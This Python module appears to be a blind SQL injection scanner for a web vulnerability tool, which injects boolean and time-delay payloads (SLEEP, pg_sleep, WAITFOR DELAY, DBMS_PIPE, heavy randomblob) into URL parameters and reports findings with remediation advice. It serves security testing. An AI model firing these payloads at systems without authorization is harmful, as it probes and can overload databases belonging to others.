"""Blind SQL Injection Scanner (Boolean-based + Time-based) for SpiderForge v3."""

from __future__ import annotations

import asyncio
import os
import statistics
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from spiderforge.evidence.collector import EvidenceCollector
from spiderforge.findings.models import Confidence, Finding, Severity
from spiderforge.scanners.base import SQL_ERROR_SIGNATURES, BaseScanner

# ═══════════════════════════════════════════════════════════════
#  Tunables
# ═══════════════════════════════════════════════════════════════

FAST_DELAY_SECONDS = 1.0
CONFIRM_DELAY_SECONDS = 4.0
FAST_DELTA_THRESHOLD = 0.8
CONFIRM_DELTA_THRESHOLD = 2.5

BOOLEAN_STRONG = 0.70
BOOLEAN_MEDIUM = 0.50
BOOLEAN_WEAK = 0.35

NOISE_STRONG = 0.05
NOISE_MEDIUM = 0.10
NOISE_WEAK = 0.15

TIME_CONTROL_STD_CONFIRMED = 0.5
TIME_CONTROL_STD_HIGH = 1.0
TIME_CONTROL_STD_MEDIUM = 1.5

MAX_SCAN_SECONDS = 60.0
MAX_PARAMS = 5
CONTROL_REPEATS = 1

# Evidence body snippet size — kept small so PDF/HTML reports stay compact.
EVIDENCE_SNIPPET_LEN = 500

DEBUG_ENABLED = os.environ.get("SPIDERFORGE_BLIND_DEBUG") == "1"


def _debug(msg: str) -> None:
    if DEBUG_ENABLED:
        print(f"[blind-debug] {msg}")


# ═══════════════════════════════════════════════════════════════
#  Scanner Implementation
# ═══════════════════════════════════════════════════════════════

class BlindSQLiScanner(BaseScanner):
    """Detects blind SQL injection via boolean-based and time-based inference."""

    name = "sqli_blind_scanner"
    category = "sqli.blind"

    async def scan(self, url: str) -> list[Finding]:
        findings: list[Finding] = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query, keep_blank_values=True)

        if not params:
            return findings

        host = self.extract_host(url)
        loop = asyncio.get_event_loop()
        started = loop.time()

        baseline_body, baseline_err = await self._dual_baseline(url)
        if baseline_body is None:
            return findings

        if getattr(self, "_baseline_noise", 0.0) > 0.45:
            _debug(f"Target noise too high ({self._baseline_noise:.4f}), skipping.")
            return findings

        for param, values in params.items():
            if len(findings) >= MAX_PARAMS:
                break
            if loop.time() - started > MAX_SCAN_SECONDS:
                break

            original_val = values[0] if values else ""
            is_numeric = original_val.strip().isdigit()
            _debug(f"Scanning param='{param}' value='{original_val}' (numeric={is_numeric})")

            # 1. Boolean scan
            bool_finding = await self._test_boolean(
                url=url,
                parsed=parsed,
                param=param,
                original_val=original_val,
                is_numeric=is_numeric,
                host=host,
                baseline_body=baseline_body,
            )
            if bool_finding is not None:
                findings.append(bool_finding)
                continue

            if loop.time() - started > MAX_SCAN_SECONDS:
                break

            # 2. Time-based scan
            remaining = MAX_SCAN_SECONDS - (loop.time() - started)
            if remaining < (CONFIRM_DELAY_SECONDS + 2.0):
                continue

            time_finding = await self._test_time(
                url=url,
                parsed=parsed,
                param=param,
                original_val=original_val,
                is_numeric=is_numeric,
                host=host,
                budget_remaining=remaining,
            )
            if time_finding is not None:
                findings.append(time_finding)

        return findings

    async def _dual_baseline(self, url: str) -> tuple[str | None, str | None]:
        resp1, _, err1 = await self.timed_get(url, timeout=15.0)
        if resp1 is None or err1:
            return None, err1

        await asyncio.sleep(0.02)

        resp2, _, err2 = await self.timed_get(url, timeout=15.0)
        if resp2 is None or err2:
            return None, err2

        try:
            body1 = resp1.safe_text()
            body2 = resp2.safe_text()
        except Exception:
            return None, "body-read-error"

        self._baseline_noise = self.response_diff(body1, body2)
        _debug(f"Baseline established. Noise={self._baseline_noise:.4f}")
        return body1, None

    async def _test_boolean(
        self,
        *,
        url: str,
        parsed,
        param: str,
        original_val: str,
        is_numeric: bool,
        host: str,
        baseline_body: str,
    ) -> Finding | None:
        probes = [
            ("1'='1", "1'='2", "raw-quote", False),
            ("' AND '1'='1", "' AND '1'='2", "sq-string", False),
            ("' AND 1=1-- -", "' AND 1=2-- -", "sq-comment", False),
            ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2", "dq-string", False),
            ("') AND ('1'='1", "') AND ('1'='2", "sq-paren", False),
            (" AND 1=1", " AND 1=2", "numeric-and", True),
            (" AND 1=1-- -", " AND 1=2-- -", "numeric-comment", True),
        ]

        best: tuple[float, float, str, str, object, str] | None = None

        for t_val, f_val, label, num_only in probes:
            if num_only and not is_numeric:
                continue

            true_url = self._inject(parsed, param, original_val + t_val)
            false_url = self._inject(parsed, param, original_val + f_val)
            noise_url = self._inject(parsed, param, original_val + t_val)

            resp_true, _, err_true = await self.timed_get(true_url, timeout=15.0)
            if resp_true is None or err_true:
                continue
            body_true = self._safe_body(resp_true)

            if self._has_sql_error(body_true):
                _debug(f"SQL Error provoked on TRUE probe ({label}). Suppressing blind.")
                return None

            resp_false, _, err_false = await self.timed_get(false_url, timeout=15.0)
            if resp_false is None or err_false:
                continue
            body_false = self._safe_body(resp_false)

            if self._has_sql_error(body_false):
                return None

            resp_noise, _, err_noise = await self.timed_get(noise_url, timeout=15.0)
            if resp_noise is None or err_noise:
                continue
            body_noise = self._safe_body(resp_noise)

            diff_tf = self.response_diff(body_true, body_false)
            diff_tt = self.response_diff(body_true, body_noise)
            _debug(f"Boolean probe '{label}': diff_tf={diff_tf:.4f}, noise={diff_tt:.4f}")

            if diff_tt >= diff_tf:
                continue

            if best is None or diff_tf > best[0]:
                best = (diff_tf, diff_tt, t_val, f_val, resp_true, body_true)

            if diff_tf >= BOOLEAN_STRONG and diff_tt <= NOISE_STRONG:
                break

        if best is None:
            return None

        diff_tf, diff_tt, t_val, f_val, resp_true, body_true = best
        confidence = self._score_boolean(diff_tf, diff_tt)
        if confidence is None:
            return None

        # NOTE: The previous version unconditionally boosted confidence by one
        # tier. This was incorrect — it inflated LOW-confidence findings to
        # MEDIUM. Confidence now reflects only the observed signal strength.

        evidence = EvidenceCollector.create_evidence(
            request_url=self._inject(parsed, param, original_val + t_val),
            http_method="GET",
            response_status=resp_true.status_code,
            response_headers=dict(resp_true.headers),
            response_body=body_true[:EVIDENCE_SNIPPET_LEN],
            payload=t_val,
            note=f"Boolean-based: diff={diff_tf:.3f}, noise={diff_tt:.3f}",
        )

        return Finding(
            title="Boolean-Based Blind SQL Injection Candidate",
            category=self.category,
            severity=Severity.HIGH,
            confidence=confidence,
            url=url,
            host=host,
            http_method="GET",
            parameter=param,
            payload_applied=t_val,
            description=(
                f"Parameter '{param}' demonstrates clear divergence between TRUE/FALSE "
                f"boolean probes (diff={diff_tf:.2f}) while remaining stable under noise={diff_tt:.2f}."
            ),
            impact="An attacker can infer database contents via conditional true/false inference.",
            remediation="Use parameterized queries and strictly validate incoming request parameters.",
            scanner_name=self.name,
            evidence=[evidence],
        )

    async def _test_time(
        self,
        *,
        url: str,
        parsed,
        param: str,
        original_val: str,
        is_numeric: bool,
        host: str,
        budget_remaining: float,
    ) -> Finding | None:
        control_url = self._inject(parsed, param, original_val)
        control_times: list[float] = []
        for _ in range(CONTROL_REPEATS):
            _, elapsed, err = await self.timed_get(control_url, timeout=10.0)
            if err is None:
                control_times.append(elapsed)

        if not control_times:
            return None

        control_mean = statistics.mean(control_times)
        control_std = statistics.pstdev(control_times) if len(control_times) > 1 else 0.0

        time_templates = [
            ("' AND SLEEP({d})-- -", "MySQL SLEEP", False),
            ("' AND pg_sleep({d})-- -", "PostgreSQL pg_sleep", False),
            ("'; WAITFOR DELAY '0:0:{d}'-- -", "MSSQL WAITFOR DELAY", False),
            ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',{d})-- -", "Oracle DBMS_PIPE", False),
            ("' AND 1=randomblob({r})-- -", "SQLite randomblob", False),
            (" AND SLEEP({d})", "MySQL SLEEP (numeric)", True),
            (" AND pg_sleep({d})", "PostgreSQL pg_sleep (numeric)", True),
        ]

        for template, label, num_only in time_templates:
            if num_only and not is_numeric:
                continue

            if budget_remaining < (FAST_DELAY_SECONDS + 2.0):
                return None

            fast_payload = template.format(d=int(FAST_DELAY_SECONDS), r=20000000)
            fast_url = self._inject(parsed, param, original_val + fast_payload)

            resp_fast, elapsed_fast, err = await self.timed_get(fast_url, timeout=15.0)
            if resp_fast is None or err:
                continue

            delta_fast = elapsed_fast - control_mean
            _debug(f"Time probe '{label}' fast delta: {delta_fast:.2f}s")

            if delta_fast < FAST_DELTA_THRESHOLD:
                continue

            body_fast = self._safe_body(resp_fast)
            if self._has_sql_error(body_fast):
                continue

            confirm_payload = template.format(d=int(CONFIRM_DELAY_SECONDS), r=400000000)
            confirm_url = self._inject(parsed, param, original_val + confirm_payload)

            resp_confirm, elapsed_confirm, err = await self.timed_get(confirm_url, timeout=25.0)
            if resp_confirm is None or err:
                return self._build_time_finding(
                    url=url, host=host, param=param,
                    payload=fast_payload, label=label,
                    resp=resp_fast, body=body_fast,
                    control_mean=control_mean, control_std=control_std,
                    probe_mean=elapsed_fast, confidence=Confidence.MEDIUM,
                    note="stage1-fast-only",
                )

            delta_confirm = elapsed_confirm - control_mean
            body_confirm = self._safe_body(resp_confirm)
            _debug(f"Time probe '{label}' confirm delta: {delta_confirm:.2f}s")

            if self._has_sql_error(body_confirm):
                continue

            confidence = self._score_time(
                delta_confirm=delta_confirm,
                control_std=control_std,
                delta_fast=delta_fast,
            )
            if confidence is None:
                return self._build_time_finding(
                    url=url, host=host, param=param,
                    payload=fast_payload, label=label,
                    resp=resp_fast, body=body_fast,
                    control_mean=control_mean, control_std=control_std,
                    probe_mean=elapsed_fast, confidence=Confidence.LOW,
                    note="confirm-unstable",
                )

            return self._build_time_finding(
                url=url, host=host, param=param,
                payload=confirm_payload, label=label,
                resp=resp_confirm, body=body_confirm,
                control_mean=control_mean, control_std=control_std,
                probe_mean=elapsed_confirm, confidence=confidence,
                note=f"confirmed delta={delta_confirm:.2f}s",
            )

        return None

    def _build_time_finding(
        self,
        *,
        url: str,
        host: str,
        param: str,
        payload: str,
        label: str,
        resp,
        body: str,
        control_mean: float,
        control_std: float,
        probe_mean: float,
        confidence: Confidence,
        note: str,
    ) -> Finding:
        delta = probe_mean - control_mean
        evidence = EvidenceCollector.create_evidence(
            request_url=payload,
            http_method="GET",
            response_status=resp.status_code,
            response_headers=dict(resp.headers),
            response_body=body[:EVIDENCE_SNIPPET_LEN],
            payload=payload,
            note=f"Time-based: control={control_mean:.2f}s, probe={probe_mean:.2f}s, delta={delta:.2f}s ({label}); {note}",
        )
        return Finding(
            title="Time-Based Blind SQL Injection Candidate",
            category="sqli.time",
            severity=Severity.HIGH,
            confidence=confidence,
            url=url,
            host=host,
            http_method="GET",
            parameter=param,
            payload_applied=payload,
            description=(
                f"Parameter '{param}' induced repeatable execution delay of ~{delta:.2f}s "
                f"proportional to the injected SQL sleep delay ({label})."
            ),
            impact="An attacker can infer database contents and structure using time delay side-channels.",
            remediation="Use parameterized queries and ensure backend database functions are not directly controllable.",
            scanner_name=self.name,
            evidence=[evidence],
        )

    @staticmethod
    def _score_boolean(diff_tf: float, diff_tt: float) -> Confidence | None:
        if diff_tf >= BOOLEAN_STRONG and diff_tt <= NOISE_STRONG:
            return Confidence.HIGH
        if diff_tf >= BOOLEAN_MEDIUM and diff_tt <= NOISE_MEDIUM:
            return Confidence.MEDIUM
        if diff_tf >= BOOLEAN_WEAK and diff_tt <= NOISE_WEAK:
            return Confidence.LOW
        return None

    @staticmethod
    def _score_time(
        *,
        delta_confirm: float,
        control_std: float,
        delta_fast: float,
    ) -> Confidence | None:
        if delta_confirm < CONFIRM_DELTA_THRESHOLD:
            return None
        if delta_confirm >= CONFIRM_DELTA_THRESHOLD and control_std <= TIME_CONTROL_STD_CONFIRMED:
            return Confidence.CONFIRMED
        if control_std <= TIME_CONTROL_STD_HIGH and delta_fast >= FAST_DELTA_THRESHOLD:
            return Confidence.HIGH
        if control_std <= TIME_CONTROL_STD_MEDIUM:
            return Confidence.MEDIUM
        return Confidence.LOW

    @staticmethod
    def _boost(c: Confidence) -> Confidence:
        """Utility: raise confidence by one tier (kept for tests / future use)."""
        order = [
            Confidence.LOW,
            Confidence.MEDIUM,
            Confidence.HIGH,
            Confidence.CONFIRMED,
        ]
        try:
            i = order.index(c)
        except ValueError:
            return c
        return order[min(i + 1, len(order) - 1)]

    @staticmethod
    def _inject(parsed, param: str, new_value: str) -> str:
        params = parse_qs(parsed.query, keep_blank_values=True)
        params[param] = [new_value]
        new_query = urlencode(params, doseq=True)
        return urlunparse(
            (parsed.scheme, parsed.netloc, parsed.path,
             parsed.params, new_query, parsed.fragment)
        )

    @staticmethod
    def _has_sql_error(body: str) -> bool:
        if not body:
            return False
        return any(sig.search(body) for sig in SQL_ERROR_SIGNATURES)

    @staticmethod
    def _safe_body(resp) -> str:
        try:
            return resp.safe_text()
        except Exception:
            return ""
